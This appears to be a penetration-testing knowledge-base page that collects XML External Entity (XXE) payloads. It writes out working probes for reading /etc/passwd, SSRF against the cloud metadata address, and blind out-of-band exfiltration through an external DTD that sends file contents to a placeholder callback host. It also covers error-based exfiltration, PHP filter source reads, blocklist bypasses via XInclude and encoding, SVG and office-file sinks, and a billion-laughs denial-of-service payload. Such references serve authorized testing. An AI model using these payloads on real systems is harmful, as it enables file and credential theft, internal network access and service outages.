---
title: "Payloads: XXE"
type: payloads
tags: [payloads, xxe, xml, ssrf, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-07-21
---

# Payloads: XXE

XML External Entity probes: file read, SSRF, OOB blind, error-based. Blind variants need an external DTD on your server - callback setup in [[oob-callbacks]]. Routed via the `hunt-injection` skill. See [[techniques/web/xxe]].

## Basic file read (in-band)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<root>&x;</root>
```

## SSRF via XXE
```xml
<!DOCTYPE r [ <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>&x;</root>
```

## OOB / blind (external DTD)
Request body:
```xml
<!DOCTYPE r [ <!ENTITY % e SYSTEM "http://<id>.oob.example/evil.dtd"> %e; ]>
<root>1</root>
```
`evil.dtd` on your server (exfiltrates file content via DNS/HTTP):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://<id>.oob.example/?d=%file;'>">
%wrap; %send;
```

## Error-based exfil (no outbound channel for data)
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % err "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
%err; %e;
```

## PHP wrapper (base64, reads source/binary safely)
```
php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

## Filter / context bypasses
```
# UTF-16 / encoding to dodge "<!DOCTYPE" blocklist
# parameter entity when general entities are blocked: use %entity;
# XInclude (no DOCTYPE control):
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Hidden sinks
```
# SVG upload -> XXE on server-side render
<svg ...><image xlink:href="file:///etc/hostname"/></svg>
# DOCX/XLSX/SOAP/RSS, any application/xml or *+xml endpoint
# Content-Type: change application/json -> application/xml and retry
```

## DoS (use only with authorization)
```xml
<!DOCTYPE lolz [ <!ENTITY a "aaaa"><!ENTITY b "&a;&a;&a;&a;&a;"> ... ]>  <!-- billion laughs -->
```

## Wired sub-techniques
- [[xpath-injection]]

<!-- auto-wired: context-reachable sub-technique pages -->
- [[xpath]]
